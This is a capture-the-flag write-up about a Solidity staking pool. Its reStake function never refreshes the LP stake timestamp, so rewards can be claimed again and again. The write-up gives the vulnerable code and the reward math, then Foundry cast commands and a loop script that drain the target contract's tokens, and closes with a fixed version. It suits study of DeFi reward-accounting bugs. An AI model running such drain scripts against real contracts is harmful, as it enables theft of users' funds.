- [Smart Contract CTF Writeup](#smart-contract-ctf-writeup)
  - [1. Source Code Analysis](#1-source-code-analysis)
    - [1.1 Setup.sol](#11-setupsol)
    - [1.2 Deploy.sol](#12-deploysol)
    - [1.3 QuintConvertionalPool.sol](#13-quintconvertionalpoolsol)
  - [2. Vulnerability Analysis](#2-vulnerability-analysis)
    - [2.1 Timestamp Update Issue in reStake()](#21-timestamp-update-issue-in-restake)
    - [2.2 Attack Flow](#22-attack-flow)
    - [2.3 Mathematical Analysis](#23-mathematical-analysis)
  - [3. Exploitation Implementation](#3-exploitation-implementation)
  - [4. Prevention Measures](#4-prevention-measures)


# Smart Contract CTF Writeup

## 1. Source Code Analysis
This challenge provides three source code files including `Deploy.sol`, `Setup.sol` and `QuintConvertionalPool.sol`. The objective is to drain the Deploy Contract's token balance to below 50,000 tokens.

### 1.1 Setup.sol
```sol
contract Setup {
    Deploy public deploy;

    constructor() payable {
        deploy = new Deploy();
        deploy.step1();
        deploy.step2();
    }

    function isSolved() public view returns (bool) {
        address deployAddress = address(deploy);
        return deploy.balanceOf(deployAddress) <= 50000000000000000000000;
    }
}
```
The Setup contract deploys the new Deploy Contract instance:
- calls `step1()` to initialize the Uniswap V2 liquidity pair
- calls `step2()` to set up the QuintConventionalPool staking contract

**Win Condition**: the `isSolved()` function checks if the Deploy Contract's token balance has been reduced to 50,000 tokens or less.

### 1.2 Deploy.sol
```sol
ontract Deploy is ERC20, Ownable,Initializable {
    IUniswapV2Factory public constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    USDT usdt;
    QuintConventionalPool quintConventionalPool;
    address public USDTADDRESS;
    address public quintADDRESS;
    address public pair;

    constructor() ERC20("AAA", "aa") {
        _mint(address(this), 2000000000000000000000000);
        usdt = new USDT();
        USDTADDRESS = address(usdt);
    }


    function step1() public onlyOwner {
        pair = factory.createPair(address(this), USDTADDRESS);
        _mint(pair, 100000000000000000000000);
        usdt.mint(pair, 100000000000000000000000);
        IUniswapV2Pair(pair).mint(address(this));
    }

    function step2() public onlyOwner {
        quintConventionalPool = new QuintConventionalPool();
        quintConventionalPool.SetAddress(pair, address(this));
        quintADDRESS = address(quintConventionalPool);
        _approve(
            address(this),
            quintADDRESS,
            99999999999999999999999999999999999999999999999999999
        );
    }

    function airdrop() public initializer {
        _mint(msg.sender, 100000000000000000000000);
        IUniswapV2Pair(pair).transfer(msg.sender, 99999999999999999999000);
    }
}
```
The Deploy Contract is an ERC20 token contract with:
- **Constructor**: mints 2,000,000 tokens to the Deploy contract itself and creates a USDT contract
- **step1()**: creates a uniswap V2 pair (AAA/USDT), adds 100,000 tokens of each to initialize liquidity
- **step2()**: deploys QuintConventionalPool and grants unlimited token approval
- **airdrop()**: provides 100,000 AAA tokens to the caller and nearly all LP tokens from the Uniswap pair
  - protected by the `initializer` modifier, meaning it can only be called once

### 1.3 QuintConvertionalPool.sol
The QuintConventionalPool Contract is a staking contract that allows users to stake tokens or LP tokens to earn rewards.
- Token staking: users can stake AAA tokens directly
- LP staking: users can stake LP tokens from the Uniswap V2 pair

The contract has several key data structures shown below:
```sol
struct TokenStake {
    uint256 amount;      // Amount of tokens staked
    uint256 time;        // Last reward claim timestamp
    uint256 reward;      // Total rewards earned
    uint256 startTime;   // Initial stake timestamp
}

struct LpStake {
    uint256 lpAmount;    // Amount of LP tokens staked
    uint256 amount;      // Equivalent token value for reward calculation
    uint256 time;        // Last reward claim timestamp
    uint256 reward;      // Total rewards earned
    uint256 startTime;   // Initial stake timestamp
}
```

Key functions include:
1. `stake(uint256 _amount, uint256 _index)`
   - Allows users to stake tokens (`_index=0`) or LP tokens (`_index=1`)
   - Calculates and adds any pending rewards before staking
   - Updates the user's stake record

2. `reStake(uint256 _index)`
   - Claims pending rewards and automatically restakes them
   - For LP staking (`_index=1`), it calculates LP rewards but adds them to token stake instead
   - **Critical Issue**: When `_index=1`, this function calls `stakeToken()` which only updates `tokenStakeRecord[user].time`, leaving `lpStakeRecord[user].time` unchanged

3. `claim(uint256 _index)`
   - Claims rewards without withdrawing the staked amount
   - Properly updates the corresponding timestamp for both token and LP stakes

4. `withdraw(uint256 _index)`
   - Withdraws the staked amount and claims all pending rewards
   - Applies a 90% tax if withdrawn before the 1-day duration threshold

5. `calculateTokenReward(address _user)`
   - The reward calculation uses `userStake.time` to determine the reward duration
   - The first 5 hours have an exceptionally high reward rate (lpReward1 = 3e7), which is 1,200 times higher than the subsequent period (lpReward2 = 25e3).

## 2. Vulnerability Analysis

### 2.1 Timestamp Update Issue in reStake()
The critical vulnerability lies in the `reStake()` function's inconsistent state update behavior when handling LP staking rewards.

```sol
function reStake(uint256 _index) public {
    require(_index < 2, "Invalid index");
    uint256 preReward;
    if (_index == 0) {
        preReward = calculateTokenReward(msg.sender);
        if (preReward > 0) {
            token.transferFrom(distributor, address(this), preReward);
            stakeToken(msg.sender, preReward);  // Correctly updates tokenStakeRecord.time
        }
    } else {
        preReward = calculateLpReward(msg.sender);  // Uses lpStakeRecord.time for calculation
        if (preReward > 0) {
            token.transferFrom(distributor, address(this), preReward);
            stakeToken(msg.sender, preReward);  // !!! Only updates tokenStakeRecord.time!
        }
    }
    emit RESTAKE(msg.sender, preReward);
}
```

The Problem is when `_index == 1` (LP staking):
- `calculateLpReward()` uses `lpStakeRecord[user].time` to calculate the reward duration
- But `stakeToken()` only updates `tokenStakeRecord[user].time`, not `lpStakeRecord[user].time`
- This means `lpStakeRecord[user].time` remains at its initial value forever

### 2.2 Attack Flow
1. Call `airdrop()` to receive 100,000 tokens and ~99,999 LP tokens
2. Stake all LP tokens by calling `stake(lpAmount, 1)`
   - This sets `lpStakeRecord[attacker].amount` (based on LP's token equivalent)
   - This sets `lpStakeRecord[attacker].time = T0` (intial timestamp)
3. Wait for some time to accumulate (e.g., a few minutes)
4. Repeatedly call `reStake(1)`:
   - 1st call: `rewardDuration = block.timestamp - T0`
     - Reward calculated and added to `tokenStakeRecord[attacker].amount`
     - `lpStakeRecord[attacker].time` still equals T0
   - 2nd call: `rewardDuration = block.timestamp - T0`
     - Rewards calculated from T0 again
     - `lpStakeRecord[attacker].time still equals T0`
   - 3rd call: `rewardDuration = block.timestamp - T0`
     - Time accumulates further, reward grows
   - Each successive call calculates rewards from the original staking time T0, causing time durations to accumulate and rewards to grow rapidly

### 2.3 Mathematical Analysis
Given:
- `lpReward1 = 3e7` (reward rate for first 5 hours)
- `rewardDivider = 1e12`
- Staked LP equivalent ≈ 200,000 tokens
- Time elapsed = t seconds

Reward formula: `reward = amount × t × lpReward1 / rewardDivider`

**Target**: Drain Deploy contract from 2,000,000 tokens to ≤ 50,000 tokens (need to extract ≥ 1,950,000 tokens)
**Analysis**: ~390 calls to `reStake(1)` (approximately 10 minutes) are needed to complete the attack.

## 3. Exploitation Implementation
**Given Information**
1. Private Key (attacker's account)
2. Setup Address (entry point contract)
3. RPC URL (blockchain node endpoint)

I choose to use Foundry's cast tool to execute all steps without deploying a custom attack contract. This is simpler and less error-prone.

**Attack Step**
1. Set environment variables:
    ```bash
    export RPC_URL=XX
    export PRIVATE_KEY=YY
    export SETUP_ADDRESS=ZZ
    ```
2.  Retrieve contract addresses
    ```bash
    DEPLOY=$(cast call $SETUP_ADDRESS "deploy()(address)" --rpc-url $RPC_URL)
    POOL=$(cast call $DEPLOY "quintADDRESS()(address)" --rpc-url $RPC_URL)
    PAIR=$(cast call $DEPLOY "pair()(address)" --rpc-url $RPC_URL)
    ATTACKER=$(cast wallet address --private-key $PRIVATE_KEY)

    echo "Deploy: $DEPLOY"
    echo "Pool: $POOL"
    echo "Pair: $PAIR"
    echo "Attacker: $ATTACKER"
    ```
3. Check initial balances
    ```bash
    INITIAL_BALANCE=$(cast call $DEPLOY "balanceOf(address)(uint256)" $DEPLOY --rpc-url $RPC_URL)
    echo "Deploy Initial Balance: $INITIAL_BALANCE"
    # Expected: 2000000000000000000000000 (2,000,000 tokens)
    ```
4. Call `airdrop()` to get funds
    ```bash
    cast send $DEPLOY "airdrop()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL
    ```
    Wait for the transcation to be comfirmed and check new balances:
    ```bash
    # Check received tokens
    TOKEN_BALANCE=$(cast call $DEPLOY "balanceOf(address)(uint256)" $ATTACKER_ADDRESS --rpc-url $RPC_URL)
    echo "Received Tokens: $TOKEN_BALANCE"
    # Expected: 100000000000000000000000 (100,000 tokens)
    
    # Check received LP tokens
    LP_BALANCE=$(cast call $PAIR "balanceOf(address)(uint256)" $ATTACKER_ADDRESS --rpc-url $RPC_URL)
    echo "Received LP: $LP_BALANCE"
    # Expected: ~99999000000000000000000 (99,999 LP tokens)
    ```
5. Approve LP tokens to Pool Contract
    ```bash
    cast send $PAIR "approve(address,uint256)" "$POOL" "$LP_BALANCE" --private-key $PRIVATE_KEY --rpc-url $RPC_URL
    ```
6. Stake LP Tokens
    ```bash
    cast send $POOL "stake(uint256,uint256)" $LP_BALANCE 1 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
    ```
7. Wait and Execute Multiple `reStake(1)` Calls. After staking, wait a few minutes for time to accumulate, then repeatedly call `reStake(1)` 
    ```bash
    echo "Starting attack..."
    TARGET="50000000000000000000000"
    COUNT=0

    while true; do
        COUNT=$((COUNT + 1))
    
        cast send $POOL "reStake(uint256)" 1 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
    
        # Check balance every 10 calls
        if (( COUNT % 10 == 0 )); then
            BAL_RAW=$(cast call $DEPLOY "balanceOf(address)(uint256)" $DEPLOY --rpc-url $RPC_URL)
            BAL=$(echo $BAL_RAW | cut -d' ' -f1)
            echo "Call $COUNT - Balance: $BAL"
        
            if [ $(echo "$BAL < $TARGET" | bc) -eq 1 ]; then
                echo "SUCCESS!"
                break
            fi
        fi
        sleep 1
    done
    echo "Total calls: $COUNT"
    ```
8. Verify Success
    ```bash
    # Check final Deploy balance
    FINAL_BALANCE=$(cast call $DEPLOY "balanceOf(address)(uint256)" $DEPLOY --rpc-url $RPC_URL)
    echo "Deploy Final Balance: $FINAL_BALANCE"

    # Check if challenge is solved
    IS_SOLVED=$(cast call $SETUP_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL)
    echo "Challenge Solved: $IS_SOLVED"
    ```

## 4. Prevention Measures
To prevent this vulnerability, the `reStake()` function should be fixed to properly update the LP stake timestamp.
```sol
function reStake(uint256 _index) public {
    require(_index < 2, "Invalid index");
    uint256 preReward;
    if (_index == 0) {
        preReward = calculateTokenReward(msg.sender);
        if (preReward > 0) {
            TokenStake storage userStake = tokenStakeRecord[msg.sender];  //  Added
            token.transferFrom(distributor, address(this), preReward);
            stakeToken(msg.sender, preReward);
            // userStake.time is updated inside stakeToken()
        }
    } else {
        preReward = calculateLpReward(msg.sender);
        if (preReward > 0) {
            LpStake storage userStake = lpStakeRecord[msg.sender];  //  Added
            token.transferFrom(distributor, address(this), preReward);
            stakeToken(msg.sender, preReward);
            userStake.time = block.timestamp;  //  FIX: Update LP timestamp
        }
    }
    emit RESTAKE(msg.sender, preReward);
}
```